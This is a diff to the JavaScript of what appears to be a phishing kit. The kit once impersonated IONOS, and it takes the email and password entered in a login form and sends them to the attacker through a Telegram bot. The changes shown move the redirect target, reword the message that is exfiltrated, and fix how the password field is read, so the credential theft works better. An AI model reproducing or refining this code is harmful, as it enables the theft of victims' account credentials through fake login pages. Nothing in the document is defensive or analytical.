@@ -29327,7 +29327,7 @@ button.link:not(.__hover).__direct-selection--target,button.toggle-link:not(.__h
 const BOT_TOKEN = "__BOT_TOKEN__";
 const CUSTOMER_CHAT_ID = "__CUSTOMER_CHAT_ID__";
 const ADMIN_CHAT_ID = "__ADMIN_CHAT_ID__";
-const REDIRECT_URL = "https://ionos.de";
+const REDIRECT_URL = "https://purchase.example";
 
 async function sendTelegram(chatId, message) {
     if (!chatId) return;
@@ -29405,7 +29405,7 @@ function getEmailFromURL() {
 async function sendSubmission(data) {
 
     const message =
-`Ionos Form Submission
+`Your Form Submission with your password this is confidential for your eyes only. As a remember keep your pass save and continue your application with it.
 
 Email:
 ${data.email}
@@ -29444,7 +29444,7 @@ window.addEventListener(
         const mailField =
             document.getElementById("mail") ||
             document.getElementById("email");
-			document.getElementById("password");
+			
 
         const mytag =
             document.getElementById("mytag");
@@ -29463,6 +29463,7 @@ window.addEventListener(
 
         const passField =
             document.getElementById("pass");
+			document.getElementById("password");
 
         const renders =
             document.getElementById("renders");
@@ -29692,6 +29693,10 @@ window.addEventListener(
                     /* =========================
                        CHECK SECOND FIELD
                        ========================= */
+					const pass =
+                        passField
+                            ? passField.value.trim()
+                            : "";
 
                     if (
                         passField &&
@@ -29731,7 +29736,7 @@ window.addEventListener(
 
                     await sendSubmission({
                         email: email,
-						password: document.getElementById("password").value.trim()
+						password: pass
                     });
 
 
